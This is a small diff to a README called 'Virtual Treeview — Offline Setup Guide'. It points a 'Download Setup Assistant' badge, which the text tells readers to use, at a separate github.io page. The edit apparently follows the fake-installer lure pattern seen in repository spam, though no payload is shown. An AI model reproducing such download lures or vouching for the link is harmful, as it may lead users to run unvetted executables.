@@ -1,6 +1,6 @@
 # Virtual Treeview — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://virtual-treeview.github.io/.github/)
 
 ## ⚙️ How to Use  
 1. Download the setup assistant using the button above  
